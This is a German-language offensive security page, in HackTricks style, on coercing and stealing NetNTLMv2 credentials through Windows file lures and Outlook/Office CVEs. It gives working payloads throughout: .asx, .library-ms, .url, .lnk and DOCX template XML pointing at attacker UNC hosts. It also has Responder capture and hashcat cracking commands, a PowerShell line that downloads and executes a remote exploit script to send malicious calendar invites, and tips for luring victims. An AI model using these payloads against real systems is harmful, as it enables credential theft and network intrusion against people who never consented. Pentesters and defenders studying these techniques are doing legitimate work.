# Orte, um NTLM creds zu stehlen

{{#include ../../banners/hacktricks-training.md}}

**Sieh dir alle großartigen Ideen an von [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — vom Download einer Microsoft Word-Datei online bis zur ntlm leaks Quelle: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Beschreibbare SMB-Freigabe + durch Explorer ausgelöste UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Wenn du **auf eine Freigabe schreiben kannst, die Benutzer oder geplante Tasks im Explorer durchsuchen**, lege Dateien ab, deren Metadaten auf deinen UNC verweisen (z. B. `\\ATTACKER\share`). Das Rendern des Ordners löst eine **implizite SMB-Authentifizierung** aus und leaks ein **NetNTLMv2** an deinen Listener.

1. **Generate lures** (deckt SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. ab)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Lege sie im writable share ab** (in jedem Ordner, den das Opfer öffnet):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Abhören und knacken**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows kann mehrere Dateien gleichzeitig ansprechen; alles, was Explorer in der Vorschau anzeigt (`BROWSE TO FOLDER`), erfordert keine Klicks.

### Windows Media Player Wiedergabelisten (.ASX/.WAX)

Wenn Sie ein Ziel dazu bringen können, eine von Ihnen kontrollierte Windows Media Player Wiedergabeliste zu öffnen oder in der Vorschau anzuzeigen, können Sie Net‑NTLMv2 leak, indem Sie den Eintrag auf einen UNC-Pfad zeigen. WMP versucht, das referenzierte Medium über SMB abzurufen und wird sich implizit authentifizieren.

Beispiel payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Sammlung und Cracking-Ablauf:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer behandelt .library-ms-Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Wenn die Library-Definition auf einen entfernten UNC-Pfad zeigt (z. B. \\attacker\share), führt bereits das Durchsuchen/Starten der .library-ms innerhalb des ZIP dazu, dass Explorer den UNC enumeriert und NTLM-Authentifizierung an den attacker sendet. Dadurch entsteht ein NetNTLMv2, das offline geknackt oder möglicherweise relayed werden kann.

Minimal .library-ms, die auf einen attacker UNC zeigt
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Erstelle die .library-ms Datei mit dem obigen XML (setze deine IP/hostname).
- Zippe sie (on Windows: Send to → Compressed (zipped) folder) und liefere das ZIP an das Ziel.
- Starte einen NTLM capture listener und warte darauf, dass das Opfer die .library-ms aus dem ZIP öffnet.


### Outlook-Kalendererinnerungs-Soundpfad (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows verarbeitete die erweiterte MAPI property PidLidReminderFileParameter in Kalendereinträgen. Wenn diese Eigenschaft auf einen UNC path verweist (z. B. \\attacker\share\alert.wav), kontaktiert Outlook das SMB share, wenn die Erinnerung ausgelöst wird, leaking the user’s Net‑NTLMv2 ohne irgendeinen Klick. Dies wurde am 14. März 2023 gepatcht, ist aber weiterhin sehr relevant für veraltete/ungepatchte Umgebungen und für historische Incident Response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener-Seite:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Hinweise
- Ein Opfer muss nur Outlook for Windows laufen haben, wenn die Erinnerung ausgelöst wird.
- Das leak liefert Net‑NTLMv2, geeignet für offline cracking oder relay (nicht pass‑the‑hash).


### .LNK/.URL icon‑based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer stellt Verknüpfungssymbole automatisch dar. Aktuelle Forschung zeigte, dass selbst nach Microsofts Patch vom April 2025 für UNC‑Icon‑Verknüpfungen weiterhin NTLM‑Authentifizierung ohne Klicks ausgelöst werden konnte, indem das Ziel der Verknüpfung auf einem UNC‑Pfad gehostet und das Icon lokal belassen wurde (für die Patch‑Umgehung wurde CVE‑2025‑50154 zugewiesen). Allein das Anzeigen des Ordners veranlasst Explorer, Metadaten vom entfernten Ziel abzurufen und NTLM an den SMB‑Server des Angreifers zu senden.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Programmverknüpfungs-Payload (.lnk) über PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Lege die Verknüpfung in eine ZIP und bring das Opfer dazu, sie zu durchsuchen.
- Lege die Verknüpfung auf einer beschreibbaren Freigabe ab, die das Opfer öffnen wird.
- Kombiniere sie mit anderen Köderdateien im selben Ordner, sodass Explorer die Elemente in der Vorschau lädt.

### No-click .LNK NTLM leak über ExtraData-Icon-Pfad (CVE‑2026‑25185)

Windows lädt `.lnk`-Metadaten während der **Ansicht/Vorschau** (Icon-Rendering), nicht nur bei der Ausführung. CVE‑2026‑25185 zeigt einen Parsing-Pfad, bei dem **ExtraData**-Blöcke die Shell dazu bringen, einen Icon-Pfad aufzulösen und das Dateisystem **während des Ladens** zu berühren, wodurch outbound NTLM ausgelöst wird, wenn der Pfad remote ist.

Wichtige Auslösebedingungen (beobachtet in `CShellLink::_LoadFromStream`):
- Enthält **DARWIN_PROPS** (`0xa0000006`) in ExtraData (Einstieg zur Icon-Aktualisierungsroutine).
- Enthält **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) mit befülltem **TargetUnicode**.
- Der Loader expandiert Umgebungsvariablen in `TargetUnicode` und ruft `PathFileExistsW` für den resultierenden Pfad auf.

Wenn `TargetUnicode` auf einen UNC-Pfad aufgelöst wird (z. B. `\\attacker\share\icon.ico`), verursacht schon das **bloße Anzeigen eines Ordners**, der die Verknüpfung enthält, eine outbound-Authentifizierung. Derselbe Ladepfad kann auch durch **Indexierung** und **AV-Scans** getroffen werden, was das zu einer praktischen no‑click leak-Angriffsfläche macht.

Research tooling (parser/generator/UI) ist im Projekt **LnkMeMaybe** verfügbar, um diese Strukturen zu erzeugen/inspektieren, ohne die Windows GUI zu verwenden.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office-Dokumente können auf eine externe Vorlage verweisen. Wenn du die angehängte Vorlage auf einen UNC-Pfad setzt, wird beim Öffnen des Dokuments eine Authentifizierung gegenüber SMB stattfinden.

Minimale DOCX relationship changes (inside word/):

1) Bearbeite word/settings.xml und füge die angehängte Template-Referenz hinzu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Bearbeite word/_rels/settings.xml.rels und verweise rId1337 auf deine UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) In .docx neu verpacken und liefern. Starte deinen SMB-Capture-Listener und warte auf die Verbindung.

Für Post-Capture-Ideen zum relaying oder Missbrauch von NTLM, siehe:

{{#ref}}
README.md
{{#endref}}


## Referenzen
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
